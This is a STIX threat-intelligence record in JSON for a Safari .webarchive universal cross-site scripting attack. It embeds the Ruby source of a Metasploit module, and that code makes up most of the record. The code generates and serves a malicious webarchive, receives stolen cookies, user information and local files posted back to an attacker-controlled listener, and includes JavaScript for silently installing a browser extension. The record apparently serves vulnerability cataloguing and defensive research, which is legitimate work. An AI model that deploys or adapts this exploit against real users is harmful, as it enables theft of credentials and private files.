{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4da3793a-028f-4fde-9edd-9d3cb4cefe9d",
    "created": "2024-08-14T16:32:31.743799Z",
    "modified": "2024-08-14T16:32:31.743803Z",
    "name": "Mac OS X Safari .webarchive File Format UXSS",
    "description": " Generates a .webarchive file for Mac OS X Safari that will attempt to inject cross-domain Javascript (UXSS), silently install a browser extension, collect user information, steal the cookie database and steal arbitrary local files.  When opened on the target machine the webarchive file must not have the quarantine attribute set, as this forces the webarchive to execute in a sandbox.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/apple_safari_webarchive_uxss.rb",
            "external_id": "apple_safari_webarchive_uxss.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2013/04/25/abusing-safaris-webarchive-file-format/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'uri'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::Format::Webarchive\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Mac OS X Safari .webarchive File Format UXSS',\n      'Description'    => %q{\n        Generates a .webarchive file for Mac OS X Safari that will attempt to\n        inject cross-domain Javascript (UXSS), silently install a browser\n        extension, collect user information, steal the cookie database,\n        and steal arbitrary local files.\n\n        When opened on the target machine the webarchive file must not have the\n        quarantine attribute set, as this forces the webarchive to execute in a\n        sandbox.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => 'joev',\n      'References'     =>\n        [\n          ['URL', 'https://www.rapid7.com/blog/post/2013/04/25/abusing-safaris-webarchive-file-format/']\n        ],\n      'DisclosureDate' => '2013-02-22',\n      'Actions'        => [[ 'WebServer', 'Description' => 'Serve exploit via web server' ]],\n      'PassiveActions' => [ 'WebServer' ],\n      'DefaultAction'  => 'WebServer'))\n  end\n\n  def run\n    if datastore[\"URIPATH\"].blank?\n      datastore[\"URIPATH\"] = \"/\" + Rex::Text.rand_text_alphanumeric(rand(10) + 6)\n    end\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file...\")\n    file_create(webarchive_xml)\n    exploit\n  end\n\n  def on_request_uri(cli, request)\n    if request.method =~ /post/i\n      data_str = request.body.to_s\n      begin\n        data = JSON::parse(data_str || '')\n        file = record_data(data, cli)\n        send_response_html(cli, '')\n        print_good \"#{data_str.length} chars received and stored to #{file}\"\n      rescue JSON::ParserError => e # json error, dismiss request & keep crit. server up\n        file = record_data(data_str, cli)\n        print_error \"Invalid JSON stored in #{file}\"\n        send_response_html(cli, '')\n      end\n    else\n      send_response(cli, webarchive_xml, {\n        'Content-Type' => 'application/x-webarchive',\n        'Content-Disposition' => \"attachment; filename=\\\"#{datastore['FILENAME']}\\\"\"\n      })\n    end\n  end\n\n  # @param [Hash] data the data to store in the log\n  # @return [String] filename where we are storing the data\n  def record_data(data, cli)\n    if data.is_a? Hash\n      file = File.basename(data.keys.first).gsub(/[^A-Za-z]/,'')\n    end\n    store_loot(\n      file || \"data\", \"text/plain\", cli.peerhost, data, \"safari_webarchive\", \"Webarchive Collected Data\"\n    )\n  end\n\n  # @return [String] formatted http/https URL of the listener\n  def backend_url\n    proto = (datastore[\"SSL\"] ? \"https\" : \"http\")\n    myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']\n    port_str = (datastore['SRVPORT'].to_i == 80) ? '' : \":#{datastore['SRVPORT']}\"\n    \"#{proto}://#{myhost}#{port_str}/#{datastore['URIPATH']}/catch\"\n  end\n\n  def message\n    super + (datastore['INSTALL_EXTENSION'] ? \" <a href='javascript:void(0)'>Click here to continue.</a>\" + popup_js : '')\n  end\n\n  def popup_js\n    wrap_with_script do\n      %Q|\n        window.onclick = function() {\n          window.open('data:text/html,<script>opener.postMessage(\"EXT\", \"*\");window.location=\"#{apple_extension_url}\";<\\\\/script>');\n        };\n      |\n    end\n  end\n\n\nend\n",
    "x_mitre_disclosure_date": "2013-02-22"
}